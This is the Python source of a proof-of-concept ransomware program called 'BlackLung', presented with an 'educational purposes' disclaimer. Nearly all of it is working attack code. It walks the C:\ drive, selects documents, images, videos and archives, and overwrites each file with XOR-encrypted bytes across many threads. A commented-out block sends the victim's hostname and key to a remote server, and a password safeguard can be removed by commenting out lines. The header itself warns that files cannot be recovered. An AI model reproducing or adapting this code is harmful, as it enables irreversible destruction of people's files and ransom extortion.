""" BlackLung Ransomware POC - (FOR EDUCATIONAL PURPOSES ONLY!!!!!!)"""

## DISCLAIMER: ##
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
# BlackLung Ransomware is just a POC  (Proof of concept) ransomware virus, and it's code is strictly for educational purposes                                                  #
# Any illegal use of BlackLung Ransomware or it's source code is strictly prohibited and will result in the source code for Blacklung Ransomware                               #
# Being removed from the public domain and all public access to it's source code, Wiki's, and Github page will be revoked permanently.                                         #
# Note that even though I have already created the server script (the server that the ransomware sends the key, and the hostname of the victim to), I will                     #
# Not be making it publicly available/accessible due to legal reasons.                                                                                                         #
# WARNING: Since the server script is not publicly available, once you run BlackLung THERE IS ABSOLUTELY NO WAY TO GET YOUR FILES BACK!!! - You have been warned!!!            #               
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #



## Code Index: ##
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
# Put a safeguard at beginning of programming for testing purposes - (Currently enabled by default, but can be disabled by commenting out three lines of code)                 #
# Supply the file extensions to encrypt                                                                                                                                        #
# Grab all the files from the machine and put them in a list                                                                                                                   #
# Generate key                                                                                                                                                                 #
# Grab Hostname                                                                                                                                                                #
# Grab current date and time of the victim's computer                                                                                                                          #
# Send hostname and key back to server - (currently disabled by default, as the server script is not publicly available)                                                       #
# encrypt all files in the list                                                                                                                                                #
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #


# Import required libraries and modules
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue



# Safeguard password  -  (Comment out the next three lines to disable the safeguard) 
safeguard = input("Please enter the safeguard password: ")
if safeguard != 'start blacklung':
    quit()

# File extensions to encrypt
encrypted_ext = ('.txt', '.pdf', '.doc', '.docx', 'odt', 'xls', 'xlsx', '.ppt', '.pptx', '.ods', 'png', '.jpg', '.jpeg', '.jpe', '.jif', '.jfif', '.jfi', '.gif', '.png', '.webp', '.tiff', '.tif', '.raw', '.arw', '.nrw', '.k25', '.cr2', '.bmp', '.dib', '.heif', '.heic', '.ind', '.indd', '.indt', '.jp2', '.j2k', '.jpf', '.jpx', '.jpm', '.mj2', '.svg', '.svgz', '.ico', '.icns', '.rtf', '.epub', '.mp4', '.mov', '.avi', '.wmv', '.webm', '.flv', '.mkv', '.zip', '.rar', '.7z', '.iso',)

# Grab all files from the machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

# Generate key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))
for i in range(encryption_level):
    key += random.choice(char_pool)

# Grab the HOSTNAME
hostname = os.getenv('COMPUTERNAME')

# Connect to the ransomware server and send hostname and key (Uncomment the next six lines connect to ransomware server, and send the hostname, key, and data and time of the victim)
# ip_address = '192.168.1.251'
# port = 5678
# time = datetime.now()
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#     s.connect((ip_address, port))
#     s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))


# Encrypt Files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
                        print('Encryption Successful!')

        except:
            print(f'Failed to encrypt {file}')
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=('key',), daemon=True)
    thread.start()

q.join()
print('Encryption was sucessful!')